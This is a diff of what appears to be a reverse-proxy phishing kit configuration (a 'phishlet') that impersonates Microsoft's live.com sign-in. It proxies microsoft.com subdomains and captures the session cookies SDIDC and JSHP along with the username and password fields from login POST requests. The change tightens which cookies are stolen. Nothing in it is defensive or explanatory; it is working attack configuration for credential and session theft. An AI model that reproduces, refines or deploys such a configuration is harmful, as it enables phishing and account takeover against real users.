@@ -9,14 +9,8 @@ proxy_hosts:
   - {phish_sub: 'www', orig_sub: 'www', domain: 'microsoft.com', session: true, is_landing: false, auto_filter: true} 
 auth_tokens:
   - domain: '.login.live.com'
-    keys: ['.*,regexp']
-  - domain: '.live.com'
-    keys: ['.*,regexp']    
-auth_urls:
-  - '/'
-  - '/*'  
-  - '/auth'
-  - '/auth/*'
+    keys: ['SDIDC','JSHP']
+    type: 'cookie'
 credentials:
   username:
     key: 'login'
@@ -26,7 +20,6 @@ credentials:
     key: 'passwd'
     search: '(.*)'
     type: 'post'
-
 force_post:
   - path: '/ppsecure/post.srf'
     search:
